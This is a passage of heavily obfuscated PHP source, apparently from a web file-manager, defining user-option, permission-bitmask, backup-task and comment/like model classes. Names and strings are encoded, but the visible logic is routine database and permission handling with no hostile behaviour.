$üìùÉåÁ[1708]); return array_unique($‚ççÄåÑ); } public function userSearch($œÖ¥–‰, $„Óà£ï = "\52") { return Model($_SERVER[ú‡®¯¨±][577])->where($œÖ¥–‰)->field($„Óà£ï)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ìòİ·ø) { $ôÃàà°‹ =& $_SERVER[ú‡®¯¨±]; $Ş¯ùØÚ = defined($ôÃàà°‹[2129]) && USER_ID ? USER_ID : $ôÃàà°‹[12]; return "\x55\x73\145\x72\117\160\164\151\x6f\156\137{$Ìòİ·ø}\137" . $Ş¯ùØÚ; } protected function filterWhere($Œœ¢Èò) { $‰‘‘ş§ =& $_SERVER[ú‡®¯¨±]; $Œœ¢Èò[$‰‘‘ş§[1708]] = defined($‰‘‘ş§[2129]) && USER_ID ? USER_ID : $‰‘‘ş§[12]; return $Œœ¢Èò; } public function cacheRemoveUser($ª£¦°éâ, $åŸÈôÑ) { return Cache::remove("\125\163\145\x72\117\x70\x74\151\x6f\156\137{$ª£¦°éâ}\x5f" . $åŸÈôÑ); } protected function optionDefault($–‘­œìö = '') { $ÊÅÔ‡ÀÚ =& $_SERVER[ú‡®¯¨±]; if ($–‘­œìö == $ÊÅÔ‡ÀÚ[12]) { return $GLOBALS[$ÊÅÔ‡ÀÚ[6]][$ÊÅÔ‡ÀÚ[2405]]; } if ($–‘­œìö == $ÊÅÔ‡ÀÚ[2406]) { return $GLOBALS[$ÊÅÔ‡ÀÚ[6]][$ÊÅÔ‡ÀÚ[2407]]; } } } goto dµãæ£¡®; A‡ìå…õ¡‘: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $æ‹¦İ¼¾ =& $_SERVER[ú‡®¯¨±]; $û™ã½£ = array(array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1907]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1909], $æ‹¦İ¼¾[1910] => 1, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1913]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1914], $æ‹¦İ¼¾[1910] => 2, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1915]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1916], $æ‹¦İ¼¾[1910] => 3, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1917]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1918], $æ‹¦İ¼¾[1910] => 4, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_VIEW), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1919]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1920], $æ‹¦İ¼¾[1910] => 5, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1921]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1922], $æ‹¦İ¼¾[1910] => 6, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($æ‹¦İ¼¾[472] => LNG($æ‹¦İ¼¾[1923]), $æ‹¦İ¼¾[1908] => $æ‹¦İ¼¾[1924], $æ‹¦İ¼¾[1910] => 7, $æ‹¦İ¼¾[1911] => 1, $æ‹¦İ¼¾[1912] => 0)); return $û™ã½£; } public static function authCheck($’éÉîÉ, $åô™£Éã) { $ Ù·ôÃé =& $_SERVER[ú‡®¯¨±]; $’éÉîÉ = intval($’éÉîÉ); if (KodUser::isRoot() && $GLOBALS[$ Ù·ôÃé[6]][$ Ù·ôÃé[1925]]) { return !0; } if ($’éÉîÉ <= 0) { return !1; } if (($’éÉîÉ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($’éÉîÉ & $åô™£Éã); } public static function authCheckShow($í…ñºéŒ) { return self::authCheck($í…ñºéŒ, self::AUTH_SHOW); } public static function authCheckView($¤ÒÊúö˜) { return self::authCheck($¤ÒÊúö˜, self::AUTH_VIEW); } public static function authCheckDownload($œ—òÑÁ®) { return self::authCheck($œ—òÑÁ®, self::AUTH_DOWNLOAD); } public static function authCheckUpload($´˜ì¹ÌŸ) { return self::authCheck($´˜ì¹ÌŸ, self::AUTH_UPLOAD); } public static function authCheckEdit($°ÀÖ€) { return self::authCheck($°ÀÖ€, self::AUTH_EDIT); } public static function authCheckRemove($Ø¡ğ»Ÿ) { return self::authCheck($Ø¡ğ»Ÿ, self::AUTH_REMOVE); } public static function authCheckShare($Ï‰±ˆÒ„) { return self::authCheck($Ï‰±ˆÒ„, self::AUTH_SHARE); } public static function authCheckComment($Ñ±™›úÃ) { return self::authCheck($Ñ±™›úÃ, self::AUTH_COMMENT); } public static function authCheckEvent($è³úŸ») { return self::authCheck($è³úŸ», self::AUTH_EVENT); } public static function authCheckRoot($ÖµåĞ”) { return self::authCheck($ÖµåĞ”, self::AUTH_ROOT); } public static function authCheckAction($…×ùÄñ, $ñŠºÕ¤³) { $àüªÑä =& $_SERVER[ú‡®¯¨±]; $›œïØî« = array($àüªÑä[1926] => self::AUTH_VIEW, $àüªÑä[1250] => self::AUTH_DOWNLOAD, $àüªÑä[109] => self::AUTH_UPLOAD, $àüªÑä[1876] => self::AUTH_EDIT, $àüªÑä[1875] => self::AUTH_REMOVE, $àüªÑä[1886] => self::AUTH_SHARE, $àüªÑä[409] => self::AUTH_COMMENT, $àüªÑä[1696] => self::AUTH_EVENT, $àüªÑä[1927] => self::AUTH_ROOT); if (!isset($›œïØî«[$ñŠºÕ¤³])) { return; } $’şŒ“–° = $›œïØî«[$ñŠºÕ¤³]; $…×ùÄñ = intval($…×ùÄñ); if ($…×ùÄñ <= 0) { return !1; } if (($…×ùÄñ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($…×ùÄñ & $’şŒ“–°); } public static function authDisable($’ùÁ¬Ó¸, $ãÜóáóä) { if (intval($’ùÁ¬Ó¸) <= 0) { return 0; } return intval($’ùÁ¬Ó¸) & ~$ãÜóáóä; } public $optionType = "\123\x79\x73\164\x65\x6d\56\x73\x6f\165\162\x63\x65\x41\x75\164\150\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\x74\x68", "\x6c\141\142\145\x6c", "\144\151\163\x70\x6c\141\x79", "\x73\171\x73\164\x65\155", "\163\157\162\164"); public function initData() { $Ş˜ÁÇùñ = $this->authDefault(); foreach ($Ş˜ÁÇùñ as $¾µÁüœ§) { $this->add($¾µÁüœ§); } } public function findAuth($¦¶Ç ıé, $‹ë“¼÷) { $ûšÕ˜Úì =& $_SERVER[ú‡®¯¨±]; $ÏÍêäÜÆ = parent::listData(); foreach ($ÏÍêäÜÆ as $ª¸Ñ¥šÍ) { $ßìôÂÑß = intval($ª¸Ñ¥šÍ[$ûšÕ˜Úì[465]]); if ($ßìôÂÑß <= 0 || $ª¸Ñ¥šÍ[$ûšÕ˜Úì[1928]] == 0) { continue; } if (($ßìôÂÑß & $¦¶Ç ıé) != $¦¶Ç ıé) { continue; } if (($ßìôÂÑß & $‹ë“¼÷) != 0) { continue; } return $ª¸Ñ¥šÍ[$ûšÕ˜Úì[453]]; } return !1; } public function findAuthReadOnly() { $»Ëùœ«  = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ìàè’ÉÒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»Ëùœ« , $Ìàè’ÉÒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $×“î±¤« =& $_SERVER[ú‡®¯¨±]; $Ñ§ıµÛ = parent::listData(); $Ù€Ü€€é = !1; foreach ($Ñ§ıµÛ as $õ®êªğ) { if ($õ®êªğ[$×“î±¤«[465]] <= 0 || $õ®êªğ[$×“î±¤«[1928]] == $×“î±¤«[224]) { continue; } if (!$Ù€Ü€€é) { $Ù€Ü€€é = $õ®êªğ; continue; } if ($Ù€Ü€€é[$×“î±¤«[465]] > $õ®êªğ[$×“î±¤«[465]]) { $Ù€Ü€€é = $õ®êªğ; } } return $Ù€Ü€€é ? $Ù€Ü€€é[$×“î±¤«[453]] : $×“î±¤«[12]; } public function listData($²ø«Ï’Å = false, $Å—Ş¼Êá = "\163\x6f\162\164", $ÒöıÁ¦Õ = false) { return parent::listData($²ø«Ï’Å, $Å—Ş¼Êá, $ÒöıÁ¦Õ); } public function update($¯ã‹Üáâ, $½İÛüã) { $†Í×ÑÂª =& $_SERVER[ú‡®¯¨±]; $’¢Ãşü• = parent::listData($¯ã‹Üáâ); $¶Šº°ìÜ = $this->findByName($½İÛüã[$†Í×ÑÂª[32]]); if (!$’¢Ãşü• || $¶Šº°ìÜ && $¶Šº°ìÜ[$†Í×ÑÂª[453]] != $’¢Ãşü•[$†Í×ÑÂª[453]]) { return !1; } $this->filterAuth($½İÛüã[$†Í×ÑÂª[465]]); return parent::update($¯ã‹Üáâ, $½İÛüã); } public function remove($ş·“•Ëò) { $ª½õ€ü = parent::listData($ş·“•Ëò); if (!$ª½õ€ü || $ª½õ€ü[$_SERVER[ú‡®¯¨±][181]]) { return !1; } return parent::remove($ş·“•Ëò); } public function add($×‡ı’“º = array()) { $‰¶‹­å» =& $_SERVER[ú‡®¯¨±]; if ($this->findByName($×‡ı’“º[$‰¶‹­å»[32]])) { return !1; } $†¾ùÂì = array($‰¶‹­å»[32] => $‰¶‹­å»[12], $‰¶‹­å»[465] => 1, $‰¶‹­å»[1929] => $‰¶‹­å»[1916], $‰¶‹­å»[1928] => 1, $‰¶‹­å»[181] => 0, $‰¶‹­å»[1930] => 0); $×‡ı’“º = array_merge($†¾ùÂì, $×‡ı’“º); $×‡ı’“º[$‰¶‹­å»[1930]] = $this->getSort(); $this->filterAuth($×‡ı’“º[$‰¶‹­å»[465]]); return parent::insert($×‡ı’“º); } private function getSort() { $¶Ò²Éçı =& $_SERVER[ú‡®¯¨±]; $Åü¼€ÆŒ = parent::listData(); $ËÎìÃ§Ü = array_to_keyvalue($Åü¼€ÆŒ, $¶Ò²Éçı[12], $¶Ò²Éçı[1930]); return empty($ËÎìÃ§Ü) ? 0 : max($ËÎìÃ§Ü) + 1; } private function filterAuth(&$şÉ¹×Ü…) { if (!$şÉ¹×Ü…) { return; } $‚Ã¹‘¤Ë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Û³É†Í‚ = array(); foreach ($‚Ã¹‘¤Ë as $ô§ê¶ã×) { if ($şÉ¹×Ü… & $ô§ê¶ã×) { $Û³É†Í‚[] = $ô§ê¶ã×; } } if (in_array(self::AUTH_ROOT, $Û³É†Í‚)) { $şÉ¹×Ü… = array_sum($‚Ã¹‘¤Ë); return; } $ôã¦„î = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Û³É†Í‚ as $ô§ê¶ã×) { if (isset($ôã¦„î[$ô§ê¶ã×])) { $Û³É†Í‚ = array_merge($Û³É†Í‚, $ôã¦„î[$ô§ê¶ã×]); } } $Û³É†Í‚[] = self::AUTH_SHOW; $şÉ¹×Ü… = array_sum(array_unique($Û³É†Í‚)); } public function sort($´’·–¹æ, $äûƒö¶) { return parent::update($´’·–¹æ, $äûƒö¶); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x62\x61\x63\x6b\165\160\114\x69\163\x74"; public $field = array("\x69\x6f", "\x6e\141\155\145", "\163\x74\141\x74\165\163", "\143\x6f\156\164\145\156\x74", "\x6d\141\156\165\x61\154", "\162\145\x73\165\x6c\x74", "\x74\x69\x6d\x65\x46\x72\x6f\x6d", "\x74\x69\155\x65\x54\157"); public function config() { $şíÅª§ß =& $_SERVER[ú‡®¯¨±]; $‰ÃªÓ†½ = Model($şíÅª§ß[825])->get($şíÅª§ß[835]); $‰ÃªÓ†½ = json_decode($‰ÃªÓ†½, !0); $‰ÃªÓ†½ = is_array($‰ÃªÓ†½) ? $‰ÃªÓ†½ : array(); if (!isset($‰ÃªÓ†½[$şíÅª§ß[809]])) { $‰ÃªÓ†½[$şíÅª§ß[809]] = $şíÅª§ß[90]; } unset($‰ÃªÓ†½[$şíÅª§ß[1678]]); Action($şíÅª§ß[1931])->taskInit(); Model($şíÅª§ß[1677])->cacheClear(); $Ê†Ãùåâ = $şíÅª§ß[1932]; $Ä‚æ¹è¼ = Model($şíÅª§ß[1933])->findByKey($şíÅª§ß[1696], $Ê†Ãùåâ); if (!$Ä‚æ¹è¼) { $Ä‚æ¹è¼ = array(); } if (isset($Ä‚æ¹è¼[$şíÅª§ß[196]])) { $Ä‚æ¹è¼[$şíÅª§ß[196]] = json_decode($Ä‚æ¹è¼[$şíÅª§ß[196]], !0); } if (isset($‰ÃªÓ†½[$şíÅª§ß[196]])) { $Ä‚æ¹è¼[$şíÅª§ß[196]][$şíÅª§ß[1681]] = $‰ÃªÓ†½[$şíÅª§ß[196]]; unset($‰ÃªÓ†½[$şíÅª§ß[196]]); } return array_merge($Ä‚æ¹è¼, $‰ÃªÓ†½); } public function listData($î¬ØÆ½ì = false, $ø–¯ğèæ = "\x6d\x6f\x64\x69\x66\171\x54\x69\x6d\145", $°ÊœÒ‘ = false) { return parent::listData($î¬ØÆ½ì, $ø–¯ğèæ, !0); } public function lastItem() { $‰ÕùºñÃ = $this->listData(); return !empty($‰ÕùºñÃ[0]) ? $‰ÕùºñÃ[0] : null; } public function kill($¥§Ë¶µ ) { $Êó¼Çı =& $_SERVER[ú‡®¯¨±]; $¾İı¯äµ = $this->listData($¥§Ë¶µ ); if (!$¾İı¯äµ || empty($¾İı¯äµ[$Êó¼Çı[32]])) { return !0; } Task::kill($Êó¼Çı[834]); Task::kill($Êó¼Çı[855]); Task::kill($Êó¼Çı[864]); $Ã‹»ëïô = $¾İı¯äµ[$Êó¼Çı[32]]; $ı•ÛÙ— = TEMP_FILES . $Êó¼Çı[833] . $Ã‹»ëïô . $Êó¼Çı[8]; IO::remove($ı•ÛÙ—, !1); return $this->remove($¥§Ë¶µ ); } public function remove($›åËëÛ) { $¹Å Ó©” = $this->listData($›åËëÛ); if (!$¹Å Ó©”) { return !0; } return $this->backupRemove($¹Å Ó©”); } private function backupRemove($ÎŒÏï«‘) { parent::remove($ÎŒÏï«‘[$_SERVER[ú‡®¯¨±][453]]); $î¾Ù÷Œğ = $this->backupPath($ÎŒÏï«‘); IO::remove($î¾Ù÷Œğ, !1); return !0; } private function backupPath($¤ıæ÷õ²) { $Í›Òíİß =& $_SERVER[ú‡®¯¨±]; $¤´ëí ş = $¤ıæ÷õ²[$Í›Òíİß[32]]; $·İé¶æ± = Model($Í›Òíİß[825])->get($Í›Òíİß[826]); $èº¬àØş = substr(md5($Í›Òíİß[827] . $·İé¶æ± . $¤´ëí ş), 0, 8); return "\x7b\151\157\72{$¤ıæ÷õ²[$Í›Òíİß[806]]}\175\x2f\x64\x61\164\x61\142\141\x73\x65\x2f\x62\x61\143\x6b\165\160\x2f" . $¤´ëí ş . $Í›Òíİß[11] . $èº¬àØş; } public function start() { $©‚€ò§ =& $_SERVER[ú‡®¯¨±]; if ($GLOBALS[$©‚€ò§[6]][$©‚€ò§[91]][$©‚€ò§[1934]] != $©‚€ò§[90]) { return !0; } $‘º¯àö = $this->config(); if (!$‘º¯àö || $‘º¯àö[$©‚€ò§[1678]] != $©‚€ò§[90]) { return !1; } $ˆ’ìå¬Ú = $this->process(); foreach ($ˆ’ìå¬Ú as $ÛªŠøÌŒ) { if ($ÛªŠøÌŒ) { return Task::restart($ÛªŠøÌŒ[$©‚€ò§[453]]); } } $Ò½¤¡è = new Backup(); $ìú¼¿ = $Ò½¤¡è->db(); if ($ìú¼¿) { $ìú¼¿ = $Ò½¤¡è->dbFile(); if ($ìú¼¿ && $‘º¯àö[$©‚€ò§[809]] == $©‚€ò§[224]) { $ìú¼¿ = $Ò½¤¡è->file(); } } Backup::set(array($©‚€ò§[805] => 1, $©‚€ò§[816] => time())); return !0; } public function process() { $¸³†œ =& $_SERVER[ú‡®¯¨±]; $×«—şÄµ = array($¸³†œ[812] => Task::get($¸³†œ[834]), $¸³†œ[817] => Task::get($¸³†œ[855]), $¸³†œ[226] => Task::get($¸³†œ[864])); $®ó½ÅïÆ = !1; foreach ($×«—şÄµ as &$Ç¿ä§¸˜) { if ($®ó½ÅïÆ) { $Ç¿ä§¸˜ = !1; continue; } if ($Ç¿ä§¸˜) { $¢å®Š—û = intval(_get($Ç¿ä§¸˜, $¸³†œ[1713], 0)); if (time() - $¢å®Š—û > 7200) { Task::kill($Ç¿ä§¸˜[$¸³†œ[453]]); $®ó½ÅïÆ = !0; $Ç¿ä§¸˜ = !1; } } } return $×«—şÄµ; } public function restore() { $ùùˆñ¹ü =& $_SERVER[ú‡®¯¨±]; ActionCall($ùùˆñ¹ü[1116], !0, 1); ActionCall($ùùˆñ¹ü[1116], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\x6d\145" => "\x63\x6f\x6d\155\x65\x6e\x74\137\155\145\164\141", "\x6d\145\x74\141\106\x69\x65\154\144" => "\x63\157\155\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¦±êÚ¾Ú) { $Ä‡˜ =& $_SERVER[ú‡®¯¨±]; if ($¦±êÚ¾Ú[$Ä‡˜[1935]]) { $çë·Ùîœ = $this->where(array($Ä‡˜[1936] => $¦±êÚ¾Ú[$Ä‡˜[1935]]))->find(); if (!$çë·Ùîœ || $çë·Ùîœ[$Ä‡˜[180]] != $¦±êÚ¾Ú[$Ä‡˜[180]] || $çë·Ùîœ[$Ä‡˜[548]] != $¦±êÚ¾Ú[$Ä‡˜[548]]) { return !1; } $this->where(array($Ä‡˜[1936] => $¦±êÚ¾Ú[$Ä‡˜[1935]]))->setAdd($Ä‡˜[1937], 1); } $¦±êÚ¾Ú[$Ä‡˜[1938]] = 0; $¦±êÚ¾Ú[$Ä‡˜[1937]] = 0; $¦±êÚ¾Ú[$Ä‡˜[805]] = 1; return $this->add($¦±êÚ¾Ú); } public function commentCount($½©É¢, $àşÌÚí¬, $ÙæáÃ‚è = false) { $Øº¼Ğó­ =& $_SERVER[ú‡®¯¨±]; if (!$½©É¢) { return array(); } if (is_string($½©É¢) || is_int($½©É¢)) { $½©É¢ = array($½©É¢); } $Àò»¶Åó = array($Øº¼Ğó­[548], $Øº¼Ğó­[1939] => $Øº¼Ğó­[544]); $Ñ‹ÊÑ«‰ = array($Øº¼Ğó­[548] => array($Øº¼Ğó­[7], $½©É¢), $Øº¼Ğó­[180] => $àşÌÚí¬); if ($ÙæáÃ‚è) { $Ñ‹ÊÑ«‰[$Øº¼Ğó­[1708]] = $ÙæáÃ‚è; } $´Œİöğù = $this->field($Àò»¶Åó)->where($Ñ‹ÊÑ«‰)->group($Øº¼Ğó­[548])->select(); return array_to_keyvalue($´Œİöğù, $Øº¼Ğó­[548], $Øº¼Ğó­[544]); } public function starTarget($Øì½ğõ, $çîš®æµ) { $ÊŒÈá“ú =& $_SERVER[ú‡®¯¨±]; $õŞßßµ” = $Øì½ğõ + self::TYPE_STAR_OFFSET; $Ñ÷×‚©Ñ = array($ÊŒÈá“ú[1708] => USER_ID, $ÊŒÈá“ú[180] => $õŞßßµ”, $ÊŒÈá“ú[548] => $çîš®æµ); $¾«âø¿ = $this->where($Ñ÷×‚©Ñ)->find(); if ($¾«âø¿) { return $this->where(array($ÊŒÈá“ú[453] => $¾«âø¿[$ÊŒÈá“ú[453]]))->delete(); } $”éÀŠ¥ = array($ÊŒÈá“ú[1935] => 0, $ÊŒÈá“ú[1708] => USER_ID, $ÊŒÈá“ú[805] => 1, $ÊŒÈá“ú[809] => $ÊŒÈá“ú[12], $ÊŒÈá“ú[180] => $õŞßßµ”, $ÊŒÈá“ú[548] => $çîš®æµ, $ÊŒÈá“ú[1938] => 0, $ÊŒÈá“ú[1937] => 0); return $this->add($”éÀŠ¥); } public function starTargetCount($ã¨ïı©Ò, $á¥¯ô¯î) { $İü—‡‹Õ =& $_SERVER[ú‡®¯¨±]; $ò„ÕÆ­  = $á¥¯ô¯î + self::TYPE_STAR_OFFSET; $ğ– ïï‚ = $this->commentCount($ã¨ïı©Ò, $ò„ÕÆ­ ); $…šüúó = $this->commentCount($ã¨ïı©Ò, $ò„ÕÆ­ , USER_ID); return array($İü—‡‹Õ[1940] => $ğ– ïï‚, $İü—‡‹Õ[1941] => $…šüúó); } public function starTargetUserList($Ë•…Åøô, $ïõ•çÎ›) { $ú©ğ¢áò =& $_SERVER[ú‡®¯¨±]; $‡ƒ­é˜¶ = $Ë•…Åøô + self::TYPE_STAR_OFFSET; $£‡ˆÛ›… = array($ú©ğ¢áò[548] => $ïõ•çÎ›, $ú©ğ¢áò[180] => $‡ƒ­é˜¶); $Ò³í±ö— = $this->where($£‡ˆÛ›…)->count(); $ÆÎÅ”‡ = array($ú©ğ¢áò[310] => $Ò³í±ö—, $ú©ğ¢áò[1942] => array()); if (!$Ò³í±ö—) { return $ÆÎÅ”‡; } $ÒÏ´ó˜Ş = $this->field($ú©ğ¢áò[1708])->where($£‡ˆÛ›…)->limit(500)->select(); $ÒÏ´ó˜Ş = array_to_keyvalue($ÒÏ´ó˜Ş, $ú©ğ¢áò[12], $ú©ğ¢áò[1708]); $ÆÎÅ”‡[$ú©ğ¢áò[1942]] = Model($ú©ğ¢áò[556])->userListInfo($ÒÏ´ó˜Ş); return $ÆÎÅ”‡; } public function prasiseUserList($Øûãë›™) { $¥µóŠÊ© =& $_SERVER[ú‡®¯¨±]; $¬ÎàáÂ¾ = array($¥µóŠÊ©[1943] => $Øûãë›™); $×ôÃÍçÀ = $this->where($¬ÎàáÂ¾)->find(); $Ì¦­ôù = _get($×ôÃÍçÀ, $¥µóŠÊ©[1938], 0); $œôìèº­ = array($¥µóŠÊ©[310] => $Ì¦­ôù, $¥µóŠÊ©[1942] => array()); if (!$Ì¦­ôù) { return $œôìèº­; } $û¦Ğ®³« = Model($¥µóŠÊ©[1944])->field($¥µóŠÊ©[1708])->where($¬ÎàáÂ¾)->limit(500)->select(); $û¦Ğ®³« = array_to_keyvalue($û¦Ğ®³«, $¥µóŠÊ©[12], $¥µóŠÊ©[1708]); $œôìèº­[$¥µóŠÊ©[1942]] = Model($¥µóŠÊ©[556])->userListInfo($û¦Ğ®³«); return $œôìèº­; } public function remove($óƒ¹îöú) { $§õØÕú =& $_SERVER[ú‡®¯¨±]; $Ü…£ĞàÃ = array($§õØÕú[1936] => $óƒ¹îöú); $ğšŸô÷ì = $this->where($Ü…£ĞàÃ)->find(); if ($ğšŸô÷ì[$§õØÕú[1935]]) { $this->where(array($§õØÕú[1936] => $ğšŸô÷ì[$§õØÕú[1935]]))->setAdd($§õØÕú[1937], -1); } return $this->where($Ü…£ĞàÃ)->delete(); } public function edit($£ÊØÜ°ë, $ñııûÉ¿) { $ÁšúÖ†­ =& $_SERVER[ú‡®¯¨±]; $‚ÔÑ…¾ú = array($ÁšúÖ†­[1936] => $£ÊØÜ°ë); return $this->where($‚ÔÑ…¾ú)->save(array($ÁšúÖ†­[1945] => $ñııûÉ¿)); } public function prasise($ÔĞ›œâç) { $®ëø“ĞÂ =& $_SERVER[ú‡®¯¨±]; $¿»ğœ˜á = Model($®ëø“ĞÂ[1946]); $áî®¨© = array($®ëø“ĞÂ[1936] => $ÔĞ›œâç, $®ëø“ĞÂ[1699] => USER_ID); $–€‰–ìé = $¿»ğœ˜á->where($áî®¨©)->find(); if (!$–€‰–ìé) { $¿»ğœ˜á->add($áî®¨©); $ııĞ˜í† = $this->where(array($®ëø“ĞÂ[1936] => $ÔĞ›œâç))->setAdd($®ëø“ĞÂ[1938], 1); } else { $¿»ğœ˜á->where($áî®¨©)->delete(); $ııĞ˜í† = $this->where(array($®ëø“ĞÂ[1936] => $ÔĞ›œâç))->setAdd($®ëø“ĞÂ[1938], -1); } return $ııĞ˜í†; } public function targetInfo($»’ı¼¤, $ºÒ’¬”Î) { $ÌáÛè¡† =& $_SERVER[ú‡®¯¨±]; $‹—ß‚ö‰ = array($ÌáÛè¡†[626] => $»’ı¼¤, $ÌáÛè¡†[627] => $ºÒ’¬”Î); $³½£Óıı = $this->where($‹—ß‚ö‰)->count(); $”‘¿¡ = "\x52\111\107\x48\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\143\x6f\155\155\145\x6e\x74\x5f\160\162\x61\151\163\x65\40\163\x74\141\x72\x20\157\156\x20\x63\x6f\155\x6d\x65\156\164\56\x63\157\x6d\x6d\145\x6e\164\x49\104\x20\75\40\x73\x74\x61\x72\56\x63\x6f\155\155\x65\156\164\111\x44"; $¶ÒÊÊ† = $this->alias($ÌáÛè¡†[409])->where($‹—ß‚ö‰)->join($”‘¿¡, $ÌáÛè¡†[1947])->count(); $ñàôŸøË = array($ÌáÛè¡†[1948] => $³½£Óıı, $ÌáÛè¡†[1949] => $¶ÒÊÊ†); return $ñàôŸøË; } public function listData($şÇâØÂŒ) { $ÃÍ¡ÉÓ¡ =& $_SERVER[ú‡®¯¨±]; if (isset($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1950]])) { if ($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1950]]) { $şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1943]] = array($ÃÍ¡ÉÓ¡[1070], intval($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1950]])); } unset($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1950]]); } if (isset($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1951]])) { if ($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1951]]) { $şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1943]] = array($ÃÍ¡ÉÓ¡[1067], intval($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1951]])); } unset($şÇâØÂŒ[$ÃÍ¡ÉÓ¡[1951]]); } return $this->_listData($şÇâØÂŒ); } private function _listData($¿ú€à²Î) { $›©ŞÌ =& $_SERVER[ú‡®¯¨±]; $™’ŞÕø = $this->where($¿ú€à²Î)->_makeOrder()->selectPage(100); $this->_listAppendParent($™’ŞÕø[$›©ŞÌ[424]]); $this->_listAppendUser($™’ŞÕø[$›©ŞÌ[424]]); $this->_listAppendMeta($™’ŞÕø[$›©ŞÌ[424]]); return $™’ŞÕø; } private function _makeOrder() { $³üåÃ™• =& $_SERVER[ú‡®¯¨±]; $è«øáî” = array($³üåÃ™•[1938], $³üåÃ™•[1937], $³üåÃ™•[227]); $İøäíşô = Input::get($³üåÃ™•[508], $³üåÃ™•[7], $³üåÃ™•[475], $è«øáî”); $ñ¹É¢ô¿ = Input::get($³üåÃ™•[509], $³üåÃ™•[7], $³üåÃ™•[1701], array($³üåÃ™•[1952], $³üåÃ™•[504])); $ìƒşÕî = $İøäíşô . $³üåÃ™•[53] . $ñ¹É¢ô¿; return $this->order($ìƒşÕî); } private function _listAppendParent(&$Øˆè¥ß) { $Ô Â´î =& $_SERVER[ú‡®¯¨±]; $á£¾ë¥Ã = 